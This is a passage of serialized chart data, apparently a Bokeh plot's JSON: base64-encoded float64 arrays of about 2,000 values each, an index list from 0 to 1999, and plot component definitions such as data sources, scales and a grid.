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","dtype":"float64","shape":[2000]}},"selected":{"id":"1163","type":"Selection"},"selection_policy":{"id":"1162","type":"UnionRenderers"}},"id":"1136","type":"ColumnDataSource"},{"attributes":{"callback":null},"id":"1105","type":"DataRange1d"},{"attributes":{},"id":"1163","type":"Selection"},{"attributes":{},"id":"1164","type":"UnionRenderers"},{"attributes":{},"id":"1109","type":"LinearScale"},{"attributes":{},"id":"1165","type":"Selection"},{"attributes":{"ticker":{"id":"1112","type":"BasicTicker"}},"id":"1115","type":"Grid"},{"attributes":{"callback":null,"data":{"x":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,363,364,365,366,367,368,369,370,371,372,373,374,375,376,377,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,396,397,398,399,400,401,402,403,404,405,406,407,408,409,410,411,412,413,414,415,416,417,418,419,420,421,422,423,424,425,426,427,428,429,430,431,432,433,434,435,436,437,438,439,440,441,442,443,444,445,446,447,448,449,450,451,452,453,454,455,456,457,458,459,460,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,476,477,478,479,480,481,482,483,484,485,486,487,488,489,490,491,492,493,494,495,496,497,498,499,500,501,502,503,504,505,506,507,508,509,510,511,512,513,514,515,516,517,518,519,520,521,522,523,524,525,526,527,528,529,530,531,532,533,534,535,536,537,538,539,540,541,542,543,544,545,546,547,548,549,550,551,552,553,554,555,556,557,558,559,560,561,562,563,564,565,566,567,568,569,570,571,572,573,574,575,576,577,578,579,580,581,582,583,584,585,586,587,588,589,590,591,592,593,594,595,596,597,598,599,600,601,602,603,604,605,606,607,608,609,610,611,612,613,614,615,616,617,618,619,620,621,622,623,624,625,626,627,628,629,630,631,632,633,634,635,636,637,638,639,640,641,642,643,644,645,646,647,648,649,650,651,652,653,654,655,656,657,658,659,660,661,662,663,664,665,666,667,668,669,670,671,672,673,674,675,676,677,678,679,680,681,682,683,684,685,686,687,688,689,690,691,692,693,694,695,696,697,698,699,700,701,702,703,704,705,706,707,708,709,710,711,712,713,714,715,716,717,718,719,720,721,722,723,724,725,726,727,728,729,730,731,732,733,734,735,736,737,738,739,740,741,742,743,744,745,746,747,748,749,750,751,752,753,754,755,756,757,758,759,760,761,762,763,764,765,766,767,768,769,770,771,772,773,774,775,776,777,778,779,780,781,782,783,784,785,786,787,788,789,790,791,792,793,794,795,796,797,798,799,800,801,802,803,804,805,806,807,808,809,810,811,812,813,814,815,816,817,818,819,820,821,822,823,824,825,826,827,828,829,830,831,832,833,834,835,836,837,838,839,840,841,842,843,844,845,846,847,848,849,850,851,852,853,854,855,856,857,858,859,860,861,862,863,864,865,866,867,868,869,870,871,872,873,874,875,876,877,878,879,880,881,882,883,884,885,886,887,888,889,890,891,892,893,894,895,896,897,898,899,900,901,902,903,904,905,906,907,908,909,910,911,912,913,914,915,916,917,918,919,920,921,922,923,924,925,926,927,928,929,930,931,932,933,934,935,936,937,938,939,940,941,942,943,944,945,946,947,948,949,950,951,952,953,954,955,956,957,958,959,960,961,962,963,964,965,966,967,968,969,970,971,972,973,974,975,976,977,978,979,980,981,982,983,984,985,986,987,988,989,990,991,992,993,994,995,996,997,998,999,1000,1001,1002,1003,1004,1005,1006,1007,1008,1009,1010,1011,1012,1013,1014,1015,1016,1017,1018,1019,1020,1021,1022,1023,1024,1025,1026,1027,1028,1029,1030,1031,1032,1033,1034,1035,1036,1037,1038,1039,1040,1041,1042,1043,1044,1045,1046,1047,1048,1049,1050,1051,1052,1053,1054,1055,1056,1057,1058,1059,1060,1061,1062,1063,1064,1065,1066,1067,1068,1069,1070,1071,1072,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1086,1087,1088,1089,1090,1091,1092,1093,1094,1095,1096,1097,1098,1099,1100,1101,1102,1103,1104,1105,1106,1107,1108,1109,1110,1111,1112,1113,1114,1115,1116,1117,1118,1119,1120,1121,1122,1123,1124,1125,1126,1127,1128,1129,1130,1131,1132,1133,1134,1135,1136,1137,1138,1139,1140,1141,1142,1143,1144,1145,1146,1147,1148,1149,1150,1151,1152,1153,1154,1155,1156,1157,1158,1159,1160,1161,1162,1163,1164,1165,1166,1167,1168,1169,1170,1171,1172,1173,1174,1175,1176,1177,1178,1179,1180,1181,1182,1183,1184,1185,1186,1187,1188,1189,1190,1191,1192,1193,1194,1195,1196,1197,1198,1199,1200,1201,1202,1203,1204,1205,1206,1207,1208,1209,1210,1211,1212,1213,1214,1215,1216,1217,1218,1219,1220,1221,1222,1223,1224,1225,1226,1227,1228,1229,1230,1231,1232,1233,1234,1235,1236,1237,1238,1239,1240,1241,1242,1243,1244,1245,1246,1247,1248,1249,1250,1251,1252,1253,1254,1255,1256,1257,1258,1259,1260,1261,1262,1263,1264,1265,1266,1267,1268,1269,1270,1271,1272,1273,1274,1275,1276,1277,1278,1279,1280,1281,1282,1283,1284,1285,1286,1287,1288,1289,1290,1291,1292,1293,1294,1295,1296,1297,1298,1299,1300,1301,1302,1303,1304,1305,1306,1307,1308,1309,1310,1311,1312,1313,1314,1315,1316,1317,1318,1319,1320,1321,1322,1323,1324,1325,1326,1327,1328,1329,1330,1331,1332,1333,1334,1335,1336,1337,1338,1339,1340,1341,1342,1343,1344,1345,1346,1347,1348,1349,1350,1351,1352,1353,1354,1355,1356,1357,1358,1359,1360,1361,1362,1363,1364,1365,1366,1367,1368,1369,1370,1371,1372,1373,1374,1375,1376,1377,1378,1379,1380,1381,1382,1383,1384,1385,1386,1387,1388,1389,1390,1391,1392,1393,1394,1395,1396,1397,1398,1399,1400,1401,1402,1403,1404,1405,1406,1407,1408,1409,1410,1411,1412,1413,1414,1415,1416,1417,1418,1419,1420,1421,1422,1423,1424,1425,1426,1427,1428,1429,1430,1431,1432,1433,1434,1435,1436,1437,1438,1439,1440,1441,1442,1443,1444,1445,1446,1447,1448,1449,1450,1451,1452,1453,1454,1455,1456,1457,1458,1459,1460,1461,1462,1463,1464,1465,1466,1467,1468,1469,1470,1471,1472,1473,1474,1475,1476,1477,1478,1479,1480,1481,1482,1483,1484,1485,1486,1487,1488,1489,1490,1491,1492,1493,1494,1495,1496,1497,1498,1499,1500,1501,1502,1503,1504,1505,1506,1507,1508,1509,1510,1511,1512,1513,1514,1515,1516,1517,1518,1519,1520,1521,1522,1523,1524,1525,1526,1527,1528,1529,1530,1531,1532,1533,1534,1535,1536,1537,1538,1539,1540,1541,1542,1543,1544,1545,1546,1547,1548,1549,1550,1551,1552,1553,1554,1555,1556,1557,1558,1559,1560,1561,1562,1563,1564,1565,1566,1567,1568,1569,1570,1571,1572,1573,1574,1575,1576,1577,1578,1579,1580,1581,1582,1583,1584,1585,1586,1587,1588,1589,1590,1591,1592,1593,1594,1595,1596,1597,1598,1599,1600,1601,1602,1603,1604,1605,1606,1607,1608,1609,1610,1611,1612,1613,1614,1615,1616,1617,1618,1619,1620,1621,1622,1623,1624,1625,1626,1627,1628,1629,1630,1631,1632,1633,1634,1635,1636,1637,1638,1639,1640,1641,1642,1643,1644,1645,1646,1647,1648,1649,1650,1651,1652,1653,1654,1655,1656,1657,1658,1659,1660,1661,1662,1663,1664,1665,1666,1667,1668,1669,1670,1671,1672,1673,1674,1675,1676,1677,1678,1679,1680,1681,1682,1683,1684,1685,1686,1687,1688,1689,1690,1691,1692,1693,1694,1695,1696,1697,1698,1699,1700,1701,1702,1703,1704,1705,1706,1707,1708,1709,1710,1711,1712,1713,1714,1715,1716,1717,1718,1719,1720,1721,1722,1723,1724,1725,1726,1727,1728,1729,1730,1731,1732,1733,1734,1735,1736,1737,1738,1739,1740,1741,1742,1743,1744,1745,1746,1747,1748,1749,1750,1751,1752,1753,1754,1755,1756,1757,1758,1759,1760,1761,1762,1763,1764,1765,1766,1767,1768,1769,1770,1771,1772,1773,1774,1775,1776,1777,1778,1779,1780,1781,1782,1783,1784,1785,1786,1787,1788,1789,1790,1791,1792,1793,1794,1795,1796,1797,1798,1799,1800,1801,1802,1803,1804,1805,1806,1807,1808,1809,1810,1811,1812,1813,1814,1815,1816,1817,1818,1819,1820,1821,1822,1823,1824,1825,1826,1827,1828,1829,1830,1831,1832,1833,1834,1835,1836,1837,1838,1839,1840,1841,1842,1843,1844,1845,1846,1847,1848,1849,1850,1851,1852,1853,1854,1855,1856,1857,1858,1859,1860,1861,1862,1863,1864,1865,1866,1867,1868,1869,1870,1871,1872,1873,1874,1875,1876,1877,1878,1879,1880,1881,1882,1883,1884,1885,1886,1887,1888,1889,1890,1891,1892,1893,1894,1895,1896,1897,1898,1899,1900,1901,1902,1903,1904,1905,1906,1907,1908,1909,1910,1911,1912,1913,1914,1915,1916,1917,1918,1919,1920,1921,1922,1923,1924,1925,1926,1927,1928,1929,1930,1931,1932,1933,1934,1935,1936,1937,1938,1939,1940,1941,1942,1943,1944,1945,1946,1947,1948,1949,1950,1951,1952,1953,1954,1955,1956,1957,1958,1959,1960,1961,1962,1963,1964,1965,1966,1967,1968,1969,1970,1971,1972,1973,1974,1975,1976,1977,1978,1979,1980,1981,1982,1983,1984,1985,1986,1987,1988,1989,1990,1991,1992,1993,1994,1995,1996,1997,1998,1999],"y":{"__ndarray__":"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